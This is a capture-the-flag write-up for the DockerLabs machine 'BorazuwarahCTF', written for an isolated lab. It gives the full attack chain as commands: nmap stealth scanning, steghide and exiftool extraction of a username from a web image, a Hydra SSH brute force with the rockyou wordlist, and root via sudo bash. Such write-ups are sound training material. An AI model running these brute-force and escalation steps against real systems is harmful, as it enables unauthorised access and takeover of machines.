BorazuwarahCTF: Writeup

📌 General Information

Platform: DockerLabs

Target IP: 172.17.0.2

Open Ports: 22 (SSH), 80 (HTTP)

Author: BorazuwarahCTF

🔎 Reconnaissance

Full TCP port scan:

nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts
Scan Explanation

-p- → Scan all ports

--open → Show only open ports

--min-rate 5000 → Faster packet sending

-sS → SYN stealth scan

-vvv → Verbose output

-n → Disable DNS resolution

-Pn → Treat host as online

-oG → Grepable output

Open Ports Discovered

22 → SSH

80 → HTTP

🌐 Web Enumeration (Port 80)

Accessing:

http://172.17.0.2

The web server hosts an image (Kinder Surprise).

The image is downloaded for further analysis.

🖼️ Steganography

Extracting hidden content:

steghide extract -sf image.jpeg

A hidden file is recovered:

secreto.txt

Viewing its content:

cat secreto.txt

Further metadata analysis:

exiftool image.jpeg

The username discovered:

borazuwarah
🔓 SSH Brute Force (Hydra)

Using Hydra with the rockyou wordlist:

hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

Valid credentials are obtained.

💻 SSH Access (Port 22)

Connecting to the machine:

ssh borazuwarah@172.17.0.2

Access is successfully gained as user borazuwarah.

⬆️ Privilege Escalation

Checking sudo permissions:

sudo -l

Output shows the user can execute:

/bin/bash

Escalating to root:

sudo -u root /bin/bash

Root access obtained ✅

🧠 Techniques Used

Full Port Scanning

Web Enumeration

Steganography

Metadata Analysis

Brute Force Attack

Linux Privilege Escalation

🛠 Tools Used

Nmap

Steghide

Exiftool

Hydra

SSH

⚠️ Disclaimer

This writeup was created for educational purposes only and performed in a controlled lab environment.
